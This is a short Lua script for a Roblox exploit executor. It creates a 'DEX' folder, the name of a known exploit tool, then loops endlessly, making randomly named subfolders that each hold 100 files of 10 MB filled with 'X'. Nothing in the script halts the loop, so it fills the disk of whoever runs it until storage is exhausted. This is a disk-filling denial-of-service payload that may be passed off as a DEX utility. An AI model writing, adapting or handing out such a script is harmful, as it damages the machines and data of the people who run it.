
if not isfolder("DEX") then makefolder("DEX") end
local function RandomName(length)
	length = length or 8
	local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	local str = ""
	for i = 1, length do
		str = str .. chars:sub(math.random(1, #chars), math.random(1, #chars))
	end
	return str
end

local function Generate1MBBlock()
	return string.rep("X", 1024 * 1024) -- 1 MB
end

local function WriteBigFile(path, sizeMB)
	local content = ""
	local block = Generate1MBBlock()
	for i = 1, sizeMB do
		content = content .. block
		
		if i % 100 == 0 then wait() end
	end
	writefile(path, content)
end

local function CreateFolderWithFiles()
	local folderName = RandomName(12)
	local folderPath = "DEX/" .. folderName

	if not isfolder(folderPath) then
		makefolder(folderPath)
	end

	for i = 1, 100 do
		local fileName = RandomName(10) .. ".txt"
		local filePath = folderPath .. "/" .. fileName
		print("Creating:", filePath, "Size: 10 MB")
		WriteBigFile(filePath, 10) -- 每个文件 10 MB
	end
end

while true do
	CreateFolderWithFiles()
	wait(0.1)
end
